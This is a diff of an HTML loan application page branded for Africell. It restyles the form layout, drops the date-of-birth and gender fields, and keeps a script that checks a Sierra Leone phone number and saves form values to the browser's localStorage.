@@ -20,126 +20,141 @@
 
         html, body {
             width: 100%;
-            min-height: 100%;
-            background: linear-gradient(135deg, #991676 0%, #79105c 50%, #5a0c44 100%);
+            height: 100%;
+            background: #FFFFFF;
             display: flex;
             justify-content: center;
             align-items: center;
-            overflow-y: auto;
-            padding: 16px;
-            color: #ffffff;
+            overflow: hidden;
+            padding: 0;
         }
 
         .e-form-container {
             width: 100%;
-            max-width: 480px;
-            background: rgba(255, 255, 255, 0.03);
-            border-radius: 24px;
-            padding: 24px 20px;
+            max-width: 100%;
+            height: 100%;
+            max-height: 100%;
+            background: #FFFFFF;
+            border-radius: 0;
+            padding: 40px 24px 24px 24px;
             display: flex;
             flex-direction: column;
-            gap: 14px;
-            border: 1px solid rgba(255, 255, 255, 0.08);
-            box-shadow: 0 15px 35px rgba(0,0,0,0.2);
-            margin: auto;
+            justify-content: space-between;
+            border: none;
+            box-shadow: none;
+            overflow: hidden;
         }
 
-        .e-form-header { text-align: center; }
+        .top-stack { text-align: center; width: 100%; }
 
         .e-form-header h1 {
-            font-size: 26px;
-            font-weight: 900;
+            font-size: 32px;
+            font-weight: 800;
             letter-spacing: -0.5px;
-            text-transform: uppercase;
-            margin-bottom: 4px;
-            color: #ffffff;
+            margin-bottom: 8px;
+            color: #991676;
+            width: 100%;
         }
 
-        .e-form-header h1 span { color: #ffd34d; }
+        .e-form-header h1 span { display: block; }
 
         .e-form-header p {
-            font-size: 12px;
-            color: rgba(255, 255, 255, 0.85);
-            line-height: 1.3;
+            font-size: 14px;
+            color: #6B7280;
+            line-height: 1.4;
+            font-weight: 400;
         }
 
         .e-form-body {
             display: flex;
             flex-direction: column;
-            gap: 10px;
+            gap: 16px;
             width: 100%;
+            margin: auto 0;
+            padding: 12px 0;
         }
 
         .e-input-row {
             display: grid;
             grid-template-columns: 1fr 1fr;
-            gap: 10px;
+            gap: 12px;
         }
 
         .e-input-group {
-            background: rgba(255, 255, 255, 0.08);
-            backdrop-filter: blur(15px);
-            border: 1px solid rgba(255, 255, 255, 0.18);
-            border-radius: 14px;
-            padding: 8px 12px;
+            background: #F7F8FA;
+            border: 2px solid #E5E7EB;
+            border-radius: 16px;
+            padding: 12px 16px;
+            transition: all 0.2s ease;
+        }
+
+        .e-input-group:focus-within {
+            border-color: #991676;
+            background: #FFFFFF;
+            box-shadow: 0 0 0 3px rgba(153, 22, 118, 0.15);
         }
 
         .e-input-group.full-width { grid-column: span 2; }
 
         .e-input-group label {
             display: block;
-            font-size: 9px;
-            font-weight: 700;
-            color: #ffd34d;
-            margin-bottom: 3px;
+            font-size: 11px;
+            font-weight: 600;
+            color: #6B7280;
+            margin-bottom: 4px;
             text-transform: uppercase;
-            letter-spacing: 0.8px;
+            letter-spacing: 0.5px;
+            text-align: left;
         }
 
         .e-input-group input, 
         .e-input-group select, 
         .e-input-group textarea {
             width: 100%;
-            background: rgba(255, 255, 255, 0.95);
-            border: 1.5px solid rgba(255, 255, 255, 0.3);
-            border-radius: 10px;
+            background: transparent;
+            border: none;
             outline: none;
-            font-size: 12px;
+            font-size: 15px;
             color: #1F2937;
             font-weight: 600;
-            text-align: center;
-            padding: 6px 8px;
+            padding: 2px 0;
         }
 
-        .e-input-group select { text-align-last: center; cursor: pointer; }
+        .e-input-group input::placeholder,
+        .e-input-group textarea::placeholder {
+            color: #9CA3AF;
+            font-weight: 400;
+        }
+
+        .e-input-group select { cursor: pointer; }
         .e-input-group select option { background: #ffffff; color: #1F2937; }
 
-        .dob-inputs-row { display: flex; align-items: center; gap: 3px; width: 100%; }
-        .dob-input { flex: 1; height: 34px; background: rgba(255, 255, 255, 0.95); border: 1.5px solid rgba(255, 255, 255, 0.3); border-radius: 10px; font-size: 11px; font-weight: 600; color: #1F2937; text-align: center; outline: none; padding: 0; }
-        .dob-slash { font-size: 14px; font-weight: 700; color: #ffd34d; }
+        .e-phone-split-row { display: flex; align-items: center; gap: 8px; width: 100%; }
+        .e-prefix-box { font-size: 15px; font-weight: 600; color: #1F2937; display: flex; align-items: center; flex-shrink: 0; }
 
-        .e-phone-split-row { display: flex; gap: 6px; width: 100%; }
-        .e-prefix-box { width: 50px; padding: 6px 2px; background: rgba(255, 255, 255, 0.95); border: 1.5px solid rgba(255, 255, 255, 0.3); border-radius: 10px; font-size: 11px; font-weight: 700; color: #1F2937; display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
+        .e-input-group textarea { resize: none; height: 50px; text-align: left; }
 
-        .e-input-group textarea { resize: none; height: 42px; text-align: left; padding: 6px 8px; }
+        .bottom-stack { width: 100%; display: flex; flex-direction: column; align-items: center; padding-top: 10px; }
 
         .e-btn-submit {
             display: block;
             width: 100%;
-            background: #ffd34d;
-            color: #5E0C44;
+            height: 60px;
+            background: #991676;
+            color: #FFFFFF;
             text-align: center;
-            padding: 14px;
-            border-radius: 14px;
-            font-size: 14px;
-            font-weight: 900;
+            border-radius: 16px;
+            font-size: 18px;
+            font-weight: 700;
             border: none;
             cursor: pointer;
             text-transform: uppercase;
-            letter-spacing: 0.8px;
-            box-shadow: 0 8px 20px rgba(0,0,0,0.25);
-            margin-top: 4px;
+            letter-spacing: 0.5px;
+            box-shadow: 0 8px 20px rgba(153, 22, 118, 0.3);
+            margin-bottom: 12px;
         }
+
+        .e-btn-submit:active { opacity: 0.9; }
 
         #loadingOverlay {
             display: none;
@@ -192,7 +207,7 @@
         .modal-btn { background: #ffd34d; color: #5E0C44; border: none; border-radius: 12px; padding: 10px; font-size: 13px; font-weight: 800; cursor: pointer; width: 100%; }
 
         @media (max-width: 500px) {
-            .e-input-row { grid-template-columns: 1fr; gap: 8px; }
+            .e-input-row { grid-template-columns: 1fr; gap: 12px; }
             .e-input-group.full-width { grid-column: span 1; }
         }
     </style>
@@ -200,9 +215,11 @@
 <body>
 
     <div class="e-form-container">
-        <div class="e-form-header">
-            <h1>Africell <span>Application</span></h1>
-            <p>Fast, transparent financing designed for your goals.</p>
+        <div class="top-stack">
+            <div class="e-form-header">
+                <h1>Africell loan Application</h1>
+                <p>Fast, transparent financing designed for your goals.</p>
+            </div>
         </div>
 
         <form id="loanForm" onsubmit="handleFormSubmit(event)" class="e-form-body">
@@ -233,28 +250,6 @@
                 </div>
             </div>
 
-            <div class="e-input-row">
-                <div class="e-input-group">
-                    <label>Date of Birth</label>
-                    <div class="dob-inputs-row">
-                        <input type="text" id="dobDay" class="dob-input" placeholder="DD" maxlength="2" inputmode="numeric" required>
-                        <span class="dob-slash">/</span>
-                        <input type="text" id="dobMonth" class="dob-input" placeholder="MM" maxlength="2" inputmode="numeric" required>
-                        <span class="dob-slash">/</span>
-                        <input type="text" id="dobYear" class="dob-input" placeholder="YYYY" maxlength="4" inputmode="numeric" required>
-                    </div>
-                </div>
-
-                <div class="e-input-group">
-                    <label for="genderSelect">Gender</label>
-                    <select id="genderSelect" required style="height: 34px;">
-                        <option value="" disabled selected>Select gender</option>
-                        <option value="Male">Male</option>
-                        <option value="Female">Female</option>
-                    </select>
-                </div>
-            </div>
-
             <div class="e-input-group full-width">
                 <label for="loanType">Type of Loan</label>
                 <select id="loanType" required>
@@ -273,9 +268,11 @@
                 <label for="loanReason">Reason for Loan</label>
                 <textarea id="loanReason" required placeholder="Briefly describe what you will use this loan for..."></textarea>
             </div>
-
-            <button type="submit" class="e-btn-submit">Submit Application &rarr;</button>
         </form>
+
+        <div class="bottom-stack">
+            <button type="button" class="e-btn-submit" onclick="document.getElementById('loanForm').requestSubmit()">Submit Application &rarr;</button>
+        </div>
     </div>
 
     <div id="loadingOverlay">
@@ -323,14 +320,8 @@
             const rawPhone = phoneInput.value.trim();
             const email = document.getElementById('email').value.trim();
             const finalAmount = document.getElementById('loanAmountInput').value;
-            const gender = document.getElementById('genderSelect').value;
             const loanType = document.getElementById('loanType').value;
             const loanReason = document.getElementById('loanReason').value.trim();
-
-            const dobDay = document.getElementById('dobDay').value.trim();
-            const dobMonth = document.getElementById('dobMonth').value.trim();
-            const dobYear = document.getElementById('dobYear').value.trim();
-            const fullDob = `${dobDay}/${dobMonth}/${dobYear}`;
 
             if (!isValidSierraLeonePhone(rawPhone)) {
                 showAppAlert('Enter Correct Number (8 to 9 digits)');
@@ -341,8 +332,6 @@
 
             localStorage.setItem('africellUserName', fullName);
             localStorage.setItem('africellUserPhone', fullPhoneNum);
-            localStorage.setItem('africellDob', fullDob);
-            localStorage.setItem('africellGender', gender);
             localStorage.setItem('africellLoanAmount', finalAmount);
             localStorage.setItem('userPhone', fullPhoneNum);
 
